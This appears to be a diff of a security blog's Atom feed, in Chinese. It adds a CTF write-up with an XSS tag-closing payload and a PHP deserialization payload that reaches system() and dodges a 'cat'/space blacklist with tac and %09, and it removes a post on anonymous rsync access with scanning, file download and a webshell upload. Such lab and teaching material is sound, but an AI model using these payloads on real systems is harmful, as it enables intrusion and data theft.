@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-11-17T14:31:45.911Z</updated>
+  <updated>2017-11-18T09:11:02.671Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,57 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>week 1 for cnas writeup</title>
+    <link href="http://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html"/>
+    <id>http://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html</id>
+    <published>2017-11-18T01:47:00.000Z</published>
+    <updated>2017-11-18T09:11:02.671Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天晚上在暑假实习部门群里，前辈说以后每周发三个CTF的题目，再加上自己最近也想做做CTF的题，遂早上起来把题目做了下，写下writeup记录。</p>
+<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的xss题，首先审查下元素，任意输入一个值。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/xss1.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	document.write(&quot;HELLO 1&lt;/br&gt;&quot;)</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>可以看到输入的值1被加到了document.write函数中输出，这里只需要把document.write的script标签闭合，再插入一个xss payload即可、</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/xss2.png" alt=""></p>
+<h2 id="PHP是最好的语言"><a href="#PHP是最好的语言" class="headerlink" title="PHP是最好的语言"></a>PHP是最好的语言</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>先用御剑扫目录发现 www.zip 文件，下载解压查看源码如下</p>
+<p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$xkey=&apos;xxxxxxx&apos;; #don&apos;t tell you.</div><div class="line"></div><div class="line">class Neo&#123;</div><div class="line">    public $cmd;</div><div class="line">    public $key;   </div><div class="line">    </div><div class="line">    function __construct($cmd,$key)&#123;</div><div class="line">        $this-&gt;cmd=$cmd;</div><div class="line">        $this-&gt;key=$key;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function __wakeup()&#123;        </div><div class="line">        $this-&gt;run();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function run()&#123;</div><div class="line">        $this-&gt;waf();</div><div class="line">        global $xkey;</div><div class="line">        if ($this-&gt;key === $xkey)&#123;</div><div class="line">            system($this-&gt;cmd);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    </div><div class="line">    function waf()&#123;        </div><div class="line">        $black = array(&apos; &apos;,&apos;cat&apos;);</div><div class="line">        foreach ($black as $key =&gt; $value) &#123;</div><div class="line">            if(stripos($this-&gt;cmd,$value))&#123;</div><div class="line">                die(&quot;Attack!&quot;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>404.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;404.html&quot;;</div><div class="line">include &quot;function.php&quot;;</div><div class="line">@unserialize($_POST[&apos;power&apos;]);</div></pre></td></tr></table></figure></p>
+<p>读源码可知这是一个php反序列化的题</p>
+<p>php反序列化问题可以参考我之前的博客</p>
+<p><a href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">反序列化漏洞的利用与学习</a><br><a href="http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">理解php序列化漏洞</a></p>
+<p>可以在404.php页面用变量power提交payload，在function中的Neo类有两个成员变量，一个key，一个cmd。key值这个地方我一直以为是xxxxxxx，后来才看到index页面有提示Key值为php_is_nice</p>
+<p>遂构造payload 先查看当前目录的文件，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/ls1.png" alt=""></p>
+<p>可以看到存在flag.php文件 在由function的代码可以知道我们需要读flag.php的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function waf()&#123;        </div><div class="line">    $black = array(&apos; &apos;,&apos;cat&apos;);</div><div class="line">    foreach ($black as $key =&gt; $value) &#123;</div><div class="line">        if(stripos($this-&gt;cmd,$value))&#123;</div><div class="line">            die(&quot;Attack!&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>由waf函数可以知道，过滤了cat和空格。在这里我们可以用</p>
+<p>%09 绕过空格 tac绕过cat</p>
+<p>其中 空格绕过</p>
+<p>参考<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></p>
+<p>tac</p>
+<p>cat命令可以显示文件的内容，它反过来写就是tac，而tac恰巧也是一个Linux命令，它的功能就是把文件内容反过来显示，文件内容的最后一行先显示，第一行最后显示</p>
+<p>遂构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:12:&quot;tac%09flag.php&quot;;&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/tac.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>MySQL Error Based SQL Injection （报错注入）总结</title>
@@ -539,7 +590,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#46;&#99;&#x6f;&#109;">&#x66;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#46;&#99;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#102;&#111;&#x6f;&#x40;&#98;&#x61;&#x72;&#46;&#99;&#x6f;&#109;">&#102;&#111;&#x6f;&#x40;&#98;&#x61;&#x72;&#46;&#99;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -2170,58 +2221,6 @@
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/dns2.jpg" alt=""></p>
 <h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
 <p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-64.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-64.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>配置漏洞之Rsync匿名访问</title>
-    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html"/>
-    <id>http://uknowsec.cn/posts/skill/配置漏洞之Rsync匿名访问.html</id>
-    <published>2017-07-12T07:24:00.000Z</published>
-    <updated>2017-07-12T08:14:11.816Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="Rsync简介"><a href="#Rsync简介" class="headerlink" title="Rsync简介"></a>Rsync简介</h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
-<p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
-<p>rsync 包括如下的一些特性：</p>
-<ul>
-<li>能更新整个目录和树和文件系统；</li>
-<li>有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等；</li>
-<li>对于安装来说，无任何特殊权限要求；</li>
-<li>对于多个文件来说，内部流水线减少文件等待的延时；</li>
-<li>能用rsh、ssh 或直接端口做为传输入端口；</li>
-<li>支持匿名rsync 同步文件，是理想的镜像工具；</li>
-</ul>
-<h2 id="寻找匿名访问Rsync方式"><a href="#寻找匿名访问Rsync方式" class="headerlink" title="寻找匿名访问Rsync方式"></a>寻找匿名访问Rsync方式</h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -n --open -p 873 X.X.X.X/24</div></pre></td></tr></table></figure></p>
-<h2 id="漏洞利用常用操作"><a href="#漏洞利用常用操作" class="headerlink" title="漏洞利用常用操作"></a>漏洞利用常用操作</h2><h3 id="例举整个同步目录或指定目录"><a href="#例举整个同步目录或指定目录" class="headerlink" title="例举整个同步目录或指定目录"></a>例举整个同步目录或指定目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync 10.0.0.12::</div><div class="line">rsync 10.0.0.12::www/</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync1.jpg" alt=""></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync2.jpg" alt=""></p>
-<h3 id="下载文件或目录到本地"><a href="#下载文件或目录到本地" class="headerlink" title="下载文件或目录到本地"></a>下载文件或目录到本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync -avz 10.0.0.12::www/test.php /root</div><div class="line">rsync -avz 10.0.0.12::www/ /var/tmp</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync3.jpg" alt=""></p>
-<h3 id="上传本地文件到服务端"><a href="#上传本地文件到服务端" class="headerlink" title="上传本地文件到服务端"></a>上传本地文件到服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsync -avz webshell.php 10.0.0.12::www/</div></pre></td></tr></table></figure>
-<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync.jpg" alt=""></p>
-<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
-<p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
-<h2 id="安全配置注意事项"><a href="#安全配置注意事项" class="headerlink" title="安全配置注意事项"></a>安全配置注意事项</h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
-<h3 id="限定IP的两种方式"><a href="#限定IP的两种方式" class="headerlink" title="限定IP的两种方式"></a>限定IP的两种方式</h3><p>IPTables防火墙</p>
-<p>给rsync的端口添加一个iptables。</p>
-<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</div></pre></td></tr></table></figure>
-<p>除此之外rsyncd.conf中的hosts allow也可以设置只允许来源ip。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hosts allow = X.X.X.X #允许访问的IP</div></pre></td></tr></table></figure>
-<h3 id="添加用户口令"><a href="#添加用户口令" class="headerlink" title="添加用户口令"></a>添加用户口令</h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</div><div class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</div></pre></td></tr></table></figure>
-<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">http://www.91ri.org/11093.html</a></p>
 ]]></content>
     
     <summary type="html">
